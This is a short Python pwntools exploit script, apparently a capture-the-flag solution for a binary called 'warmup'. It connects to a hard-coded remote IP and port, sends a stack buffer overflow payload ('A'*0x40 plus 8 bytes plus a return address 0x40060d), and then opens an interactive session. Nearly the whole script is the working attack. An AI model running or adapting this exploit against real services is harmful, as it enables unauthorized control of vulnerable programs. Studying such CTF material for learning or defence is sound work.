#!/usr/bin/env python
# coding: utf-8

from pwn import *

if len(sys.argv) == 1:
    DEBUG = 1
else:
    DEBUG = 0


r      = lambda x: p.recv(x)
ru     = lambda x: p.recvuntil(x)
rud    = lambda x: p.recvuntil(x, drop=True)
se     = lambda x: p.send(x)
sel    = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

if DEBUG:
    
    context.terminal = ['tmux','splitw','-h']
    context.log_level = 'debug'
    elf=ELF("./warmup")
    p = process('./warmup')
    #libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    libc = ELF("./libc.so.6")
else :
    #111.198.29.45 30139
    p = remote("111.198.29.45", 30139, timeout=3)
    print("123")
    ru(">")  
    payload="A"*0x40+"B"*8+p64(0x40060d)
   # gdb.attach(p,"b *0x4006a3")
    sel(payload)#   ru("you!")
    print "over"
 

    p.interactive()


